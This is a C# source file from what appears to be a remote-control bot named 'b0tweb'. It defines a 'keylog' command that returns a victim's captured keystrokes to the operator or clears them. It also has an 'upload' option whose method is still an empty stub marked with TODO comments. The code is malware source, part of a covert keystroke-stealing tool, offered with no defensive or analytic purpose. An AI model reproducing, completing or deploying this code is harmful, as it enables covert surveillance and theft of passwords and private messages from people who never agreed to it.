namespace b0tweb.Commands
{
    class KeyloggerCommand : AbstractCommand
    {
        public override string Command => "keylog";

        protected override string ExecuteCommand(string[] args)
        {
            Keylogger keylogger = Keylogger.GetInstance;

            if (args.Length == 0)
            {
                return keylogger.Data;
            }
            else if (args[0].Equals("clear"))
            {
                keylogger.Clear();

                return "keylogger cleared";
            }
            else if (args[0].Equals("upload"))
            {
                return this.uploadData();
            }

            // TODO: store functionality?
            // TODO: upload functionality

            return keylogger.Data;
        }

        private string uploadData()
        {
            return "";
        }
    }
}
